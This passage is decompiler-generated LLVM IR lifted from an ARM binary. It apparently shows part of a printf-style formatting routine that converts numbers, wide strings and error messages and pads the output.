  br i1 %v7_f8ec, label %bb140, label %dec_label_pc_f818

bb140:                                            ; preds = %dec_label_pc_f80c
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_f824

dec_label_pc_f818:                                ; preds = %dec_label_pc_f80c
  br i1 %v7_f838, label %dec_label_pc_f828, label %dec_label_pc_f824

dec_label_pc_f824:                                ; preds = %.thread84, %bb140, %dec_label_pc_f818
  %v0_f85086 = phi i32 [ %v5_f804, %.thread84 ], [ %v4_f7d8, %bb140 ], [ %v4_f7d8, %dec_label_pc_f818 ]
  br label %dec_label_pc_f828

dec_label_pc_f828:                                ; preds = %dec_label_pc_f818, %dec_label_pc_f824
  %v0_f85085 = phi i32 [ %v0_f85086, %dec_label_pc_f824 ], [ %v4_f7d8, %dec_label_pc_f818 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_f824 ], [ 6, %dec_label_pc_f818 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_f828 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_f828, i32* %r3.global-to-local, align 4
  %v1_f82c = icmp slt i32 %v3_f828, 0
  %v7_f830. = select i1 %v1_f82c, i32 %v7_f830, i32 32
  store i32 %v7_f830., i32* @sb, align 4
  br i1 %v7_f838, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_f828
  store i32 %v2_f784, i32* @lr, align 4
  %v2_f840 = load i32, i32* %ip.global-to-local, align 4
  %v5_f840 = mul i32 %v2_f840, 4
  %v6_f840 = add i32 %v5_f840, %v2_f784
  store i32 %v6_f840, i32* %r3.global-to-local, align 4
  %v2_f844 = add i32 %v6_f840, -260
  %v3_f844 = inttoptr i32 %v2_f844 to i32*
  %v4_f844 = load i32, i32* %v3_f844, align 4
  store i32 %v4_f844, i32* %r3.global-to-local, align 4
  %v2_f84c = and i32 %v4_f844, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_f828, %.thread16
  %storemerge94 = phi i32 [ %v2_f84c, %.thread16 ], [ 1024, %dec_label_pc_f828 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_f85085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_f858 = call i32 @_load_inttype()
  %v0_f85c = load i32, i32* @r1, align 4
  store i32 %v0_f85c, i32* %r2.global-to-local, align 4
  %v0_f868 = load i32, i32* @r4, align 4
  store i32 %v0_f868, i32* %r3.global-to-local, align 4
  store i32 %v2_f86c, i32* %r0.global-to-local, align 4
  %v0_f870 = load i32, i32* @r5, align 4
  %v6_f874 = call i32 @_uintmaxtostr(i8* %v5_f874, i32 %v0_f858, i32 %v0_f85c, i32 %v0_f868, i32 %v0_f870)
  store i32 %v6_f874, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_f874, i32* @r6, align 4
  br i1 %v3_f884, label %bb148, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %bb145
  %v7_f874 = inttoptr i32 %v6_f874 to i8*
  %v3_f888 = load i8, i8* %v7_f874, align 1
  %v7_f88c = icmp eq i8 %v3_f888, 45
  %v2_f894 = or i32 %v0_f7f8, 2
  %v2_f894.stack_var_-316.4 = select i1 %v7_f88c, i32 %v2_f894, i32 %v0_f7f8
  store i32 %v2_f894.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_f88c, label %.thread18, label %dec_label_pc_f8a8

.thread18:                                        ; preds = %dec_label_pc_f888
  %v3_f898 = add i32 %v6_f874, 1
  store i32 %v3_f898, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_f8a8:                                ; preds = %dec_label_pc_f888
  %v1_f8a8 = and i32 %v2_f894.stack_var_-316.4, 2
  %v2_f8a8 = icmp eq i32 %v1_f8a8, 0
  br i1 %v2_f8a8, label %dec_label_pc_f8b4, label %bb146

bb146:                                            ; preds = %dec_label_pc_f8a8
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_f8b4:                                ; preds = %dec_label_pc_f8a8
  %v1_f8b4 = urem i32 %v2_f894.stack_var_-316.4, 2
  %v2_f8b4 = icmp eq i32 %v1_f8b4, 0
  br i1 %v2_f8b4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_f8b4
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_f8b4, %bb147
  %v0_f910 = phi i32 [ %v6_f874, %bb145 ], [ %v3_f898, %.thread18 ], [ %v6_f874, %dec_label_pc_f8b4 ], [ %v6_f874, %bb147 ], [ %v6_f874, %bb146 ]
  %v0_f8cc = phi i32 [ %v0_f7f8, %bb145 ], [ %v2_f894, %.thread18 ], [ %v0_f7f8, %dec_label_pc_f8b4 ], [ %v0_f7f8, %bb147 ], [ %v0_f7f8, %bb146 ]
  %v3_f8bc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_f8bc, i32* %r2.global-to-local, align 4
  store i32 %v0_f8cc, i32* %r3.global-to-local, align 4
  %v1_f8c4 = icmp slt i32 %v3_f8bc, 0
  br i1 %v1_f8c4, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_f8f4 = phi i32 [ %v3_f8bc, %bb148 ], [ 1, %bb149 ]
  %v1_f8cc = and i32 %v0_f8cc, 16
  %v2_f8cc = icmp eq i32 %v1_f8cc, 0
  store i32 %v2_faa0, i32* %r3.global-to-local, align 4
  %v2_f8d4 = sub i32 %v2_faa0, %v0_f910
  %v1_f8d8 = add i32 %v2_f8d4, 127
  store i32 %v1_f8d8, i32* @r5, align 4
  br i1 %v2_f8cc, label %bb157, label %dec_label_pc_f8e0

dec_label_pc_f8e0:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_f8e0
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_f8e0, %bb151
  br i1 %v7_f8ec, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_f8f4, %v1_f8d8
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_f8f8, label %dec_label_pc_f900, label %bb157

dec_label_pc_f900:                                ; preds = %bb155
  %v1_f900 = inttoptr i32 %v0_f910 to i8*
  %v2_f900 = load i8, i8* %v1_f900, align 1
  %v3_f900 = zext i8 %v2_f900 to i32
  store i32 %v3_f900, i32* %r3.global-to-local, align 4
  %v7_f904 = icmp eq i8 %v2_f900, 48
  br i1 %v7_f904, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_f900
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_f900
  %v2_f90c = add i32 %v2_f8d4, 128
  store i32 %v2_f90c, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_f948 = phi i32 [ %v0_f8f4, %bb155 ], [ %v0_f8f4, %bb150 ], [ 1, %bb156 ], [ %v2_f90c, %.thread25 ], [ %v0_f8f4, %bb154 ]
  %v1_f910 = inttoptr i32 %v0_f910 to i8*
  %v2_f910 = load i8, i8* %v1_f910, align 1
  %v3_f910 = zext i8 %v2_f910 to i32
  store i32 %v3_f910, i32* %r3.global-to-local, align 4
  %v7_f914 = icmp eq i8 %v2_f910, 48
  br i1 %v7_f914, label %dec_label_pc_f91c, label %dec_label_pc_f944

dec_label_pc_f91c:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_f920 = load i32, i32* @r7, align 4
  %v7_f924 = icmp slt i32 %v0_f920, 6
  br i1 %v7_f924, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_f91c
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_f91c, %bb158
  br i1 %v7_f838, label %.thread26, label %dec_label_pc_f938

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_12870.355 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_fab8

dec_label_pc_f938:                                ; preds = %bb159
  %v2_f938 = icmp eq i32 %v5_f948, 0
  br i1 %v2_f938, label %bb160, label %dec_label_pc_f944

bb160:                                            ; preds = %dec_label_pc_f938
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_fab8

dec_label_pc_f944:                                ; preds = %dec_label_pc_f938, %bb157
  %v2_f944 = sub i32 %v5_f948, %v1_f8d8
  %tmp199 = icmp ugt i32 %v5_f948, %v1_f8d8
  br i1 %tmp199, label %.thread90, label %dec_label_pc_fab8

.thread90:                                        ; preds = %dec_label_pc_f944
  store i32 %v2_f944, i32* @r4, align 4
  br label %dec_label_pc_fad4thread-pre-split

dec_label_pc_f954:                                ; preds = %dec_label_pc_f7c8
  br i1 %tmp196, label %dec_label_pc_f990, label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f954
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_f968 = load i32, i32* @fp, align 4
  store i32 %v0_f968, i32* %r0.global-to-local, align 4
  %v2_f96c = load i32, i32* %v1_f7b0, align 4
  %v5_f96c = load i32, i32* %v4_f96c, align 4
  store i32 %v5_f96c, i32* %r2.global-to-local, align 4
  store i32 %v2_f970, i32* %r3.global-to-local, align 4
  %v6_f974 = call i32 @_fpmaxtostr(i32 %v0_f968, i32 %v2_f96c, i32 %v5_f96c, i32* nonnull %stack_var_-328, i32 62932)
  store i32 %v6_f974, i32* %r0.global-to-local, align 4
  %v1_f978 = icmp slt i32 %v6_f974, 0
  br i1 %v1_f978, label %dec_label_pc_fc24, label %dec_label_pc_f980

dec_label_pc_f980:                                ; preds = %dec_label_pc_f95c
  %v2_f984 = add i32 %v6_f974, %stack_var_-336.2
  store i32 %v2_f984, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fc10

dec_label_pc_f990:                                ; preds = %dec_label_pc_f954
  br i1 %v3_f994, label %dec_label_pc_fa30, label %dec_label_pc_f998

dec_label_pc_f998:                                ; preds = %dec_label_pc_f990
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_f990, label %dec_label_pc_f9a8, label %dec_label_pc_f9f8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f998
  %v2_f9a8 = load i32, i32* %v1_f7b0, align 4
  store i32 %v2_f9a8, i32* %r3.global-to-local, align 4
  %v9_f9ac = icmp eq i32 %v2_f9a8, 0
  store i32 %v2_f9a8, i32* %stack_var_-44, align 4
  br i1 %v9_f9ac, label %dec_label_pc_fac0, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9a8
  %v3_f9b8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_f9b8, i32* %r3.global-to-local, align 4
  store i32 %v2_f9bc, i32* @r0, align 4
  %v5_f9c8 = icmp slt i32 %v3_f9b8, -1
  br i1 %v5_f9c8, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_f9b8
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_f9b8, %bb161
  %storemerge193 = phi i32 [ %v3_f9b8, %bb161 ], [ -1, %dec_label_pc_f9b8 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_f9bc, i32* @r1, align 4
  store i32 %v2_f9d0, i32* %r3.global-to-local, align 4
  %v0_f9d4 = call i32 @__GI_wcsrtombs()
  store i32 %v0_f9d4, i32* %r0.global-to-local, align 4
  %v7_f9d8 = icmp eq i32 %v0_f9d4, -1
  store i32 %v0_f9d4, i32* @r5, align 4
  br i1 %v7_f9d8, label %dec_label_pc_fc24, label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %bb162
  %v0_f9e4 = load i32, i32* @sl, align 4
  store i32 %v0_f9e4, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_f9e4, i32* @r6, align 4
  br label %dec_label_pc_fad4

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f998
  store i32 %v2_faa0, i32* %r8.global-to-local, align 4
  %v2_f9fc = load i32, i32* %v1_f7b0, align 4
  store i32 %v2_f9d0, i32* %r2.global-to-local, align 4
  store i32 %v2_faa0, i32* %r0.global-to-local, align 4
  %v3_fa08 = call i32 @__GI_wcrtomb(i32 %v2_faa0, i32 %v2_f9fc, i32 %v2_f9d0)
  store i32 %v3_fa08, i32* %r0.global-to-local, align 4
  %v7_fa0c = icmp eq i32 %v3_fa08, -1
  store i32 %v3_fa08, i32* @r5, align 4
  br i1 %v7_fa0c, label %dec_label_pc_fc24, label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9f8
  %v0_fa18 = load i32, i32* @sl, align 4
  store i32 %v0_fa18, i32* @r4, align 4
  store i32 %v2_faa0, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_fa28 = trunc i32 %v0_fa18 to i8
  %v2_fa28 = load i32, i32* %r8.global-to-local, align 4
  %v4_fa28 = add i32 %v2_fa28, %v3_fa08
  %v5_fa28 = inttoptr i32 %v4_fa28 to i8*
  store i8 %v1_fa28, i8* %v5_fa28, align 1
  %v0_fad8.pre.pre = load i32, i32* @r5, align 4
  %v1_fad8.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fad4thread-pre-split

dec_label_pc_fa30:                                ; preds = %dec_label_pc_f990
  br i1 %v3_fa34, label %dec_label_pc_fa94, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa30
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_fa40 = load i32, i32* %v1_f7b0, align 4
  br i1 %v7_fa30, label %dec_label_pc_fa40, label %dec_label_pc_fa6c

dec_label_pc_fa40:                                ; preds = %dec_label_pc_fa38
  store i32 %v2_fa40, i32* @r6, align 4
  %v2_fa44 = icmp eq i32 %v2_fa40, 0
  br i1 %v2_fa44, label %dec_label_pc_fac0, label %dec_label_pc_fa4c

dec_label_pc_fa4c:                                ; preds = %dec_label_pc_fa40, %dec_label_pc_fa9c
  %v0_fa5c = phi i32 [ %v2_fa40, %dec_label_pc_fa40 ], [ %v3_faac, %dec_label_pc_fa9c ]
  %v3_fa4c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_fa4c, i32* %r3.global-to-local, align 4
  %v5_fa58 = icmp slt i32 %v3_fa4c, -1
  br i1 %v5_fa58, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_fa4c
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_fa4c, %bb163
  %storemerge194 = phi i32 [ %v3_fa4c, %bb163 ], [ -1, %dec_label_pc_fa4c ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_fa5c, i32* %r0.global-to-local, align 4
  %v1_fa60 = inttoptr i32 %v0_fa5c to i8*
  %v2_fa60 = call i32 @strnlen(i8* %v1_fa60)
  store i32 %v2_fa60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fac8

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa38
  store i32 %v2_fa40, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_faa0, i32* @r6, align 4
  store i32 %v2_fa40, i32* %stack_var_-180, align 4
  br label %dec_label_pc_fad4thread-pre-split

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa30
  br i1 %v7_fa94, label %dec_label_pc_fa9c, label %dec_label_pc_fc24

dec_label_pc_fa9c:                                ; preds = %dec_label_pc_fa94
  %v0_fa9c = call i32 @__errno_location()
  store i32 %v0_fa9c, i32* %r0.global-to-local, align 4
  %v1_faa4 = inttoptr i32 %v0_fa9c to i32*
  %v2_faa4 = load i32, i32* %v1_faa4, align 4
  store i32 %v2_faa4, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_faac = call i32 @__GI___glibc_strerror_r(i32 %v2_faa4, i32 %v2_faa0, i32 128)
  store i32 %v3_faac, i32* %r0.global-to-local, align 4
  store i32 %v3_faac, i32* @r6, align 4
  br label %dec_label_pc_fa4c

dec_label_pc_fab8:                                ; preds = %dec_label_pc_f944, %.thread26, %bb160
  %v0_fad8.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_f8d8, %dec_label_pc_f944 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fad4thread-pre-split

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fa40, %dec_label_pc_f9a8
  store i32 ptrtoint ([7 x i8]* @global_var_12878.358 to i32), i32* @r6, align 4
  br label %dec_label_pc_fac8

dec_label_pc_fac8:                                ; preds = %bb164, %dec_label_pc_fac0
  %storemerge = phi i32 [ 6, %dec_label_pc_fac0 ], [ %v2_fa60, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_fad4

dec_label_pc_fad4thread-pre-split:                ; preds = %.thread90, %dec_label_pc_fa18, %dec_label_pc_fa6c, %dec_label_pc_fab8
  %v1_fad8.pre = phi i32 [ 0, %dec_label_pc_fab8 ], [ %v1_fad8.pre.pre, %dec_label_pc_fa18 ], [ 0, %dec_label_pc_fa6c ], [ %v2_f944, %.thread90 ]
  %v0_fad8.pre = phi i32 [ %v0_fad8.pre81, %dec_label_pc_fab8 ], [ %v0_fad8.pre.pre, %dec_label_pc_fa18 ], [ 1, %dec_label_pc_fa6c ], [ %v1_f8d8, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_f8cc, %dec_label_pc_fab8 ], [ %v0_f7f8, %dec_label_pc_fa18 ], [ %v0_f7f8, %dec_label_pc_fa6c ], [ %v0_f8cc, %.thread90 ]
  %v0_fad4.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_fad4

dec_label_pc_fad4:                                ; preds = %dec_label_pc_fad4thread-pre-split, %dec_label_pc_f9e4, %dec_label_pc_fac8
  %v1_fb14 = phi i32 [ %v1_fad8.pre, %dec_label_pc_fad4thread-pre-split ], [ %v0_f9e4, %dec_label_pc_f9e4 ], [ 0, %dec_label_pc_fac8 ]
  %v0_fad8 = phi i32 [ %v0_fad8.pre, %dec_label_pc_fad4thread-pre-split ], [ %v0_f9d4, %dec_label_pc_f9e4 ], [ %storemerge, %dec_label_pc_fac8 ]
  %v0_fae0 = phi i32 [ %v0_fad4.pr, %dec_label_pc_fad4thread-pre-split ], [ 11, %dec_label_pc_f9e4 ], [ 11, %dec_label_pc_fac8 ]
  %v0_fb1c = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_fad4thread-pre-split ], [ %v0_f7f8, %dec_label_pc_f9e4 ], [ %v0_f7f8, %dec_label_pc_fac8 ]
  %v7_fad4 = icmp eq i32 %v0_fae0, 11
  %v2_fad8 = add i32 %v0_fad8, %v1_fb14
  br i1 %v7_fad4, label %dec_label_pc_faf0, label %bb165

bb165:                                            ; preds = %dec_label_pc_fad4
  %v7_fae8 = icmp sgt i32 %v0_fae0, 5
  %. = select i1 %v7_fae8, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_faec = add i32 %., %v2_fad8
  br label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fad4, %bb165
  %v0_fb04 = phi i32 [ %v2_fad8, %dec_label_pc_fad4 ], [ %v2_faec, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_faf4 = sub i32 %tmp97, %v0_fb04
  %v3_faf4 = icmp uge i32 %tmp97, %v0_fb04
  %v9_faf4 = icmp eq i32 %tmp97, %v0_fb04
  %v2_faf8 = xor i1 %v3_faf4, true
  %v3_faf8 = or i1 %v9_faf4, %v2_faf8
  br i1 %v3_faf8, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_faf0
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_faf0, %bb166
  %v2_fafc = xor i1 %v9_faf4, true
  %v3_fafc = and i1 %v3_faf4, %v2_fafc
  br i1 %v3_fafc, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_fb04.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_faf4, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_fb14 = phi i32 [ %v1_fb04.pre, %._crit_edge ], [ %v2_faf4, %bb168 ]
  %v2_fb04 = add i32 %v0_fb04, %stack_var_-336.2
  %v2_fb08 = add i32 %v2_fb04, %v2_fb14
  store i32 %v2_fb08, i32* %ip.global-to-local, align 4
  store i32 %v0_fb1c, i32* %r3.global-to-local, align 4
  %v0_fb10 = load i32, i32* @sb, align 4
  %v7_fb10 = icmp eq i32 %v0_fb10, 48
  br i1 %v7_fb10, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_fb14 = add i32 %v2_fb14, %v1_fb14
  store i32 %v3_fb14, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_fb30 = phi i32 [ %v2_fb14, %bb169 ], [ 0, %bb170 ]
  %v1_fb1c = and i32 %v0_fb1c, 8
  store i32 %v1_fb1c, i32* @r8, align 4
  %v2_fb1c = icmp eq i32 %v1_fb1c, 0
  br i1 %v2_fb1c, label %dec_label_pc_fb28, label %dec_label_pc_fb44

dec_label_pc_fb28:                                ; preds = %.thread29
  %v0_fb28 = load i32, i32* @fp, align 4
  store i32 %v0_fb28, i32* %r0.global-to-local, align 4
  store i32 %v0_fb30, i32* %r2.global-to-local, align 4
  %v4_fb34 = call i32 @_charpad(i32 %v0_fb28, i8 32, i32 %v0_fb30)
  store i32 %v4_fb34, i32* %r0.global-to-local, align 4
  %v1_fb38 = load i32, i32* @sl, align 4
  %v9_fb38 = icmp eq i32 %v4_fb34, %v1_fb38
  br i1 %v9_fb38, label %dec_label_pc_fb40, label %dec_label_pc_fc24

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fb28
  %v0_fb40 = load i32, i32* @r8, align 4
  store i32 %v0_fb40, i32* @sl, align 4
  %v0_fb4c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %.thread29, %dec_label_pc_fb40
  %v0_fb4c = phi i32 [ %v0_fae0, %.thread29 ], [ %v0_fb4c.pre, %dec_label_pc_fb40 ]
  %v0_fb48 = load i32, i32* @fp, align 4
  %v2_fb4c = add i32 %v0_fb4c, ptrtoint (i32* @global_var_12880.360 to i32)
  store i32 %v2_fb4c, i32* %r0.global-to-local, align 4
  %v2_fb50 = inttoptr i32 %v2_fb4c to i8*
  %v3_fb50 = call i32 @__GI_fputs_unlocked(i8* %v2_fb50, i32 %v0_fb48)
  %v0_fb54 = load i32, i32* @fp, align 4
  store i32 %v0_fb54, i32* %r0.global-to-local, align 4
  %v0_fb5c = load i32, i32* @r4, align 4
  store i32 %v0_fb5c, i32* %r2.global-to-local, align 4
  %v4_fb60 = call i32 @_charpad(i32 %v0_fb54, i8 48, i32 %v0_fb5c)
  store i32 %v4_fb60, i32* %r0.global-to-local, align 4
  %v1_fb64 = load i32, i32* @r4, align 4
  %v9_fb64 = icmp eq i32 %v4_fb60, %v1_fb64
  br i1 %v9_fb64, label %dec_label_pc_fb6c, label %dec_label_pc_fc24

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb44
  %v3_fb6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_fb6c, i32* %r3.global-to-local, align 4
  %v2_fb70 = icmp eq i32 %v3_fb6c, 0
  br i1 %v2_fb70, label %dec_label_pc_fb80, label %dec_label_pc_fbe0thread-pre-split

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb6c
  %v0_fb80 = load i32, i32* @r5, align 4
  %v2_fb80 = icmp eq i32 %v0_fb80, 0
  br i1 %v2_fb80, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_fb80
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_fb80
  %v1_fb88 = load i32, i32* @r6, align 4
  store i32 %v1_fb88, i32* %r0.global-to-local, align 4
  %v1_fb90 = load i32, i32* @fp, align 4
  store i32 %v1_fb90, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 64408, i32* @lr, align 4
  %v1_fb94 = xor i1 %v2_fb80, true
  call void @__pseudo_cond_branch(i1 %v1_fb94, i32 ptrtoint (i32* @global_var_10b90.351 to i32))
  %v0_fb98 = load i32, i32* %r0.global-to-local, align 4
  %v1_fb98 = load i32, i32* @r5, align 4
  %v9_fb98 = icmp eq i32 %v0_fb98, %v1_fb98
  br i1 %v9_fb98, label %dec_label_pc_fbf8, label %dec_label_pc_fc24

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fbe0
  %v2_fba4 = icmp ult i32 %v1_fba8, 128
  %.v1_fba8 = select i1 %v2_fba4, i32 %v1_fba8, i32 128
  store i32 %.v1_fba8, i32* @r2, align 4
  %v0_fbb0 = call i32 @__GI_wcsrtombs()
  store i32 %v0_fbb0, i32* @r4, align 4
  %v2_fbb4 = icmp eq i32 %v0_fbb0, 0
  store i32 %v0_fbb0, i32* %r3.global-to-local, align 4
  store i32 %v2_faa0, i32* %r0.global-to-local, align 4
  %v0_fbc4 = load i32, i32* @fp, align 4
  store i32 %v0_fbc4, i32* %r2.global-to-local, align 4
  br i1 %v2_fbb4, label %dec_label_pc_fbd4, label %dec_label_pc_fbcc

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fba4
  %v3_fbcc = call i32 @__stdio_fwrite(i32 %v2_faa0, i32 %v0_fbb0, i32 %v0_fbc4)
  store i32 %v3_fbcc, i32* %r0.global-to-local, align 4
  store i32 %v3_fbcc, i32* %r3.global-to-local, align 4
  %v1_fbd4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fba4, %dec_label_pc_fbcc
  %v1_fbd4 = phi i32 [ 0, %dec_label_pc_fba4 ], [ %v1_fbd4.pre, %dec_label_pc_fbcc ]
  %v0_fbd8 = phi i32 [ 0, %dec_label_pc_fba4 ], [ %v3_fbcc, %dec_label_pc_fbcc ]
  %v9_fbd4 = icmp eq i32 %v0_fbd8, %v1_fbd4
  %v1_fbd8 = load i32, i32* @r5, align 4
  %v2_fbd8 = sub i32 %v1_fbd8, %v0_fbd8
  store i32 %v2_fbd8, i32* @r5, align 4
  br i1 %v9_fbd4, label %dec_label_pc_fbe0, label %dec_label_pc_fc24

dec_label_pc_fbe0thread-pre-split:                ; preds = %dec_label_pc_fb6c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_fbe4.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_fbe0

dec_label_pc_fbe0:                                ; preds = %dec_label_pc_fbe0thread-pre-split, %dec_label_pc_fbd4
  %v1_fba8 = phi i32 [ %v0_fbe4.pr, %dec_label_pc_fbe0thread-pre-split ], [ %v2_fbd8, %dec_label_pc_fbd4 ]
  store i32 %v2_faa0, i32* @r6, align 4
  %v2_fbe4 = icmp eq i32 %v1_fba8, 0
  store i32 %v2_f9bc, i32* @r1, align 4
  store i32 %v2_f9d0, i32* %r3.global-to-local, align 4
  store i32 %v2_faa0, i32* @r0, align 4
  br i1 %v2_fbe4, label %dec_label_pc_fbf8, label %dec_label_pc_fba4

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fbe0, %.thread36
  %v0_fbf8 = load i32, i32* @fp, align 4
  store i32 %v0_fbf8, i32* %r0.global-to-local, align 4
  %v0_fc00 = load i32, i32* @sl, align 4
  store i32 %v0_fc00, i32* %r2.global-to-local, align 4
  %v4_fc04 = call i32 @_charpad(i32 %v0_fbf8, i8 32, i32 %v0_fc00)
  store i32 %v4_fc04, i32* %r0.global-to-local, align 4
  %v1_fc08 = load i32, i32* @sl, align 4
  %v9_fc08 = icmp eq i32 %v4_fc04, %v1_fc08
  br i1 %v9_fc08, label %dec_label_pc_fc10, label %dec_label_pc_fc24

dec_label_pc_fc10:                                ; preds = %dec_label_pc_fbf8, %dec_label_pc_f980, %dec_label_pc_f7a4
  %stack_var_-316.3 = phi i32 [ %v0_f7f8, %dec_label_pc_f7a4 ], [ %v0_fb1c, %dec_label_pc_fbf8 ], [ %v0_f7f8, %dec_label_pc_f980 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_f7a4 ], [ %v2_fb08, %dec_label_pc_fbf8 ], [ %v2_f984, %dec_label_pc_f980 ]
  %v3_fc10 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_fc10, i32* @r4, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_f6b4, %dec_label_pc_fc10
